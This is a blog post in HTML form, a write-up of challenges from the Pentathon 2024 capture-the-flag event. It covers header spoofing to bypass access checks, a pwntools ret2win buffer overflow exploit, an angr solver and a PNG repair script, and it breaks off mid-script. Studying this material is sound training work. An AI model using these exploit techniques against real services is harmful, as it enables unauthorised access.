@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Throughout the past weekend, I participated in the Pentathon2024, a beginner-friendly Capture The Flag event. Throughout the competition, I successfully navigated through some challenges, these are t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF WriteUp: Pentathon 2024">
+<meta property="og:url" content="https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/index.html">
+<meta property="og:site_name" content="sf4ult">
+<meta property="og:description" content="Throughout the past weekend, I participated in the Pentathon2024, a beginner-friendly Capture The Flag event. Throughout the competition, I successfully navigated through some challenges, these are t">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/front.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/web/health_care1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/web/health_care2.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/web/health_care3.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/web/health_care3.1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/web/health_care4.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/web/health_care5.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/web/health_care5.1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/web/health_care6.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/pwn/overflow1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/pwn/overflow2.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/pwn/overflow-solve.gif">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/pwn/bof1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/pwn/bof2.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/rev/byte1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/rev/bytebybyte-solve.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/epic_chl1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/epic_chl3.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/epic_chl2.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/epic_chl5.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/epic_chl6.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/epic_chl7.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/recovered_png.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/epic_chl_flag.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/data_dievergence.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/data_dievergence2.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/forensic/data_divergence_flag.gif">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/ot/modbus1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/ot/modbus2.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/ot/modbus3.gif">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/ot/logic_sniff1.png">
+<meta property="og:image" content="https://sf4ult.github.io/imgs/post8/ot/logic_sniff2.gif">
+<meta property="article:published_time" content="2024-03-19T16:59:11.605Z">
+<meta property="article:modified_time" content="2024-03-19T18:21:08.291Z">
+<meta property="article:author" content="Durgesh">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="forensic">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="Hardware">
+<meta property="article:tag" content="rev">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sf4ult.github.io/imgs/post8/front.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTF WriteUp: Pentathon 2024</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 vazir">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archive">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/04/post7/vishwaCTF_2024/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&text=CTF WriteUp: Pentathon 2024"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&is_video=false&description=CTF WriteUp: Pentathon 2024"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF WriteUp: Pentathon 2024&body=Check out this article: https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&title=CTF WriteUp: Pentathon 2024"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&name=CTF WriteUp: Pentathon 2024&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2024/03/19/post8/Pentathon_2024/&t=CTF WriteUp: Pentathon 2024"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Health-care"><span class="toc-number">1.1.</span> <span class="toc-text">Health care</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Descripttion"><span class="toc-number">1.1.1.</span> <span class="toc-text">Descripttion</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Solve"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#USB-Ultra-Secure-Bank"><span class="toc-number">1.2.</span> <span class="toc-text">USB - Ultra Secure Bank</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Descripttion-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Descripttion</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#overflow"><span class="toc-number">2.1.</span> <span class="toc-text">overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-number">2.1.1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Main-func"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">Main func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Flag-func"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">Flag func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bof"><span class="toc-number">2.2.</span> <span class="toc-text">bof</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Main-func-1"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">Main func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#secretFunction-func"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">secretFunction func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REV"><span class="toc-number">3.</span> <span class="toc-text">REV</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#byte-by-byte"><span class="toc-number">3.1.</span> <span class="toc-text">byte by byte</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Main-func-2"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">Main func</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Solve-2"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-CTF"><span class="toc-number">4.</span> <span class="toc-text">Post CTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensic"><span class="toc-number">5.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Echoes-of-the-Unseen"><span class="toc-number">5.1.</span> <span class="toc-text">Echoes of the Unseen</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-3"><span class="toc-number">5.1.1.</span> <span class="toc-text">Description</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-Divergence"><span class="toc-number">5.2.</span> <span class="toc-text">Data Divergence</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-4"><span class="toc-number">5.2.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OT-Operational-Technology-Hardware"><span class="toc-number">6.</span> <span class="toc-text">OT(Operational Technology)&#x2F;Hardware</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#M0dBu5"><span class="toc-number">6.1.</span> <span class="toc-text">M0dBu5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-5"><span class="toc-number">6.1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#What-is-Modbus"><span class="toc-number">6.1.2.</span> <span class="toc-text">What is Modbus</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#L0g1c-sn1ff"><span class="toc-number">6.2.</span> <span class="toc-text"># L0g1c_sn1ff</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-6"><span class="toc-number">6.2.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CTF WriteUp: Pentathon 2024
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Durgesh</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-19T16:59:11.605Z" class="dt-published" itemprop="datePublished">2024-03-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Hardware/" rel="tag">Hardware</a>, <a class="p-category" href="/tags/forensic/" rel="tag">forensic</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/rev/" rel="tag">rev</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/imgs/post8/front.png" alt="front.png"></p>
+<p>Throughout the past weekend, I participated in the Pentathon2024, a beginner-friendly Capture The Flag event. Throughout the competition, I successfully navigated through some challenges, these are those challenges writeups that i managed to solve.</p>
+<p>All challenges can be found <a target="_blank" rel="noopener" href="https://github.com/durge5h/CTFs/tree/main/Competition/Pentathon-2024">here</a></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Health-care"><a href="#Health-care" class="headerlink" title="Health care"></a>Health care</h3><h4 id="Descripttion"><a href="#Descripttion" class="headerlink" title="Descripttion"></a>Descripttion</h4><blockquote>
+<p>You finally come across a unique health care application. Everyone has tried their best to get info from it, but no one has been able to get anything useful. It allways makes silly excuses. Can you help us?</p>
+</blockquote>
+<p>this challenge is quite similar to the last ctf i.e. VishwaCTF-2024’s <a target="_blank" rel="noopener" href="https://github.com/peace-ranger/CTF-WriteUps/blob/main/2024/VishwaCTF%202024/h34d3rs.md">h34d3rs</a>, where we have to to perform host header injection according to the response from server.</p>
+<p><img src="/imgs/post8/web/health_care1.png" alt="health_care1.png"></p>
+<p>using username and password as admin i loged in to website where we had flag section in right side of portal, after clicking that it gives this err</p>
+<p><img src="/imgs/post8/web/health_care2.png" alt="health_care2.png"></p>
+<p> after capturing request through burp suite it shows</p>
+<p><img src="/imgs/post8/web/health_care3.png" alt="health_care3.png"></p>
+<p>as we can see its says only pentabrowser is allowed or else it will redirect to home page, we can do it by using <strong>User-Agent: pentabrowser</strong></p>
+<p><img src="/imgs/post8/web/health_care3.1.png" alt="health_care3.1.png"></p>
+<p>the next response it gives is  <strong>Acess denied, You are not coming from our local server</strong>, so for that we can use header <strong>Referer</strong> with value <strong><a target="_blank" rel="noopener" href="http://localhost/">http://localhost/</a></strong></p>
+<p><img src="/imgs/post8/web/health_care4.png" alt="health_care4.png"></p>
+<p><strong>Access denied, Please use a proxy, your request should originate from 169.172.18.9</strong>, here <strong>X-Forwarded-For</strong> header worked for me</p>
+<p><img src="/imgs/post8/web/health_care5.png" alt="health_care5.png"></p>
+<p>the next response it gives is <strong>Your request should stay in proxy server for 10 seconds</strong> it took me some time to find the working header that is <strong>[Age][<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/imgs/post8/web/HTTP/Headers/Age]">https://developer.mozilla.org/en-US/docs/imgs/post8/web/HTTP/Headers/Age]</a></strong></p>
+<p><img src="/imgs/post8/web/health_care5.1.png" alt="health_care5.1.png"></p>
+<p>after adding all those headers in request sequentially gives me the flag</p>
+<p><img src="/imgs/post8/web/health_care6.png" alt="health_care6.png"></p>
+<h5 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solve.py</span><br></pre></td></tr></table></figure>
+
+<h3 id="USB-Ultra-Secure-Bank"><a href="#USB-Ultra-Secure-Bank" class="headerlink" title="USB - Ultra Secure Bank"></a>USB - Ultra Secure Bank</h3><h4 id="Descripttion-1"><a href="#Descripttion-1" class="headerlink" title="Descripttion"></a>Descripttion</h4><blockquote>
+<p>Ultra Secure Bank was famous for being super safe — so safe that no one could break in. So the bank challenged the whole world to try to break in. Can you find your way into the most secure account and save the day? Find a way past its strong security? Show your skills and conquer the Ultra Secure Bank!</p>
+</blockquote>
+<p>will update when ctf platform will re-live …..</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>I found an exposed service on a power grid machine. I heard that buffer overflow is one of the most common memory corruption bugs. Maybe it might work here that</p>
+</blockquote>
+<h5 id="Main-func"><a href="#Main-func" class="headerlink" title="Main func"></a>Main func</h5><p><img src="/imgs/post8/pwn/overflow1.png" alt="overflow1.png"></p>
+<p>if you see line 11 <strong>gets</strong> function being used that means its clearly vulnerable bof as no-bound checking, so we can leverage it for overwriting <strong>local_14</strong> var  as flag function is being called if and only if <strong>local_14 !&#x3D; 0</strong> where flag func print the flag.</p>
+<h5 id="Flag-func"><a href="#Flag-func" class="headerlink" title="Flag func"></a>Flag func</h5><p><img src="/imgs/post8/pwn/overflow2.png" alt="overflow2.png"></p>
+<h5 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h5><p><img src="/imgs/post8/pwn/overflow-solve.gif" alt="overflow-solve.gif"></p>
+<h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>Walter has encountered a buffer overflow in an exposed service but he is unable to exploit it. Help him out.</p>
+</blockquote>
+<h5 id="Main-func-1"><a href="#Main-func-1" class="headerlink" title="Main func"></a>Main func</h5><p><img src="/imgs/post8/pwn/bof1.png" alt="bof1.png"></p>
+<p>function on line no. 10 being used is most probably <strong>scanf</strong> function and same as before no bound checking where the first arg i.e. is <strong>%s</strong> format specifier and second one is user input.</p>
+<h5 id="secretFunction-func"><a href="#secretFunction-func" class="headerlink" title="secretFunction func"></a>secretFunction func</h5><p><img src="/imgs/post8/pwn/bof2.png" alt="bof2.png"></p>
+<p>this particular function is printing the flag.</p>
+<p>okay, pretty clear it is. its just typical <a href="https://sf4ult.github.io/2023/02/12/post2/pwn2own/#Gaining-root-privilege-02">ret2win</a> challenge </p>
+<h5 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line"></span><br><span class="line">    padding = cyclic(<span class="number">40</span>)</span><br><span class="line">    win = elf.symbols[<span class="string">&#x27;secretFunction&#x27;</span>]</span><br><span class="line">    payload = padding + pack(win)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="REV"><a href="#REV" class="headerlink" title="REV"></a>REV</h2><h3 id="byte-by-byte"><a href="#byte-by-byte" class="headerlink" title="byte by byte"></a>byte by byte</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>You’ve been hired as a cybersecurity consultant to test the defenses of a major corporation’s secure network. Your objective is to gain access to their encrypted data vault, which contains sensitive information and trade secrets. All of these have been stored behind a password system. Can you crack the code and gain access to the corporate vault?</p>
+</blockquote>
+<h5 id="Main-func-2"><a href="#Main-func-2" class="headerlink" title="Main func"></a>Main func</h5><p><img src="/imgs/post8/rev/byte1.png" alt="byte1.png"></p>
+<p>scattered flag , we can do it either manually or using angr</p>
+<h5 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./condition&quot;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x401584</span></span>)  </span><span class="comment"># Target address</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_flag</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;VALID INPUT:&quot;</span>, state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/post8/rev/bytebybyte-solve.png" alt="bytebybyte-solve.png"></p>
+<h2 id="Post-CTF"><a href="#Post-CTF" class="headerlink" title="Post CTF"></a>Post CTF</h2><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Echoes-of-the-Unseen"><a href="#Echoes-of-the-Unseen" class="headerlink" title="Echoes of the Unseen"></a>Echoes of the Unseen</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><blockquote>
+<p>Within the digital void, a silent challenge beckons. No maps, no signs only intuition guides. Will you decode the whispers of light and shadow, or succumb to obscurity? Journey forth, unveil the unseen.</p>
+</blockquote>
+<p>A file png file given, that seems to be corrupted </p>
+<p><img src="/imgs/post8/forensic/epic_chl1.png" alt="epic_chl1.png"></p>
+<p>most probably author has done some alternation of structure of png file</p>
+<p>looking its hexdump using <strong>ghex</strong> i got to know that the veryfirst byte has tempered to <strong>98</strong> instead of <strong>89</strong> i amended it check it again </p>
+<p><img src="/imgs/post8/forensic/epic_chl3.png" alt="epic_chl3.png"></p>
+<p>it shows <strong>illegal (unless recently approved) unknown, public chunk</strong> that is <strong>IFAT</strong></p>
+<p><img src="/imgs/post8/forensic/epic_chl2.png" alt="epic_chl2.png"></p>
+<p>so if you aware of structure of png it has no chunk named IFAT that suppose to be IDAT. We can convert it either manually or using <strong>dd</strong></p>
+<p><img src="/imgs/post8/forensic/epic_chl5.png" alt="epic_chl5.png"></p>
+<p>after changing forged chunk to original one</p>
+<p><img src="/imgs/post8/forensic/epic_chl6.png" alt="epic_chl6.png"></p>
+<p>again <strong>illegal (unless recently approved) unknown, public chunk</strong> that is <strong>ICAT</strong>, lets change it </p>
+<p><img src="/imgs/post8/forensic/epic_chl7.png" alt="epic_chl7.png"></p>
+<p>now only left with removing extra dat after <strong>IEND</strong> chunk lets do it</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_iend</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">        iend_offset = data.rfind(<span class="string">b&#x27;IEND&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> iend_offset + <span class="built_in">len</span>(<span class="string">b&#x27;IEND&#x27;</span>) + <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_extra_data</span>(<span class="params">file_path, output_path</span>):</span><br><span class="line">    iend_offset = find_iend(file_path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> input_file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> op:</span><br><span class="line">            op.write(input_file.read(iend_offset))</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;tmp.png&#x27;</span></span><br><span class="line">op = <span 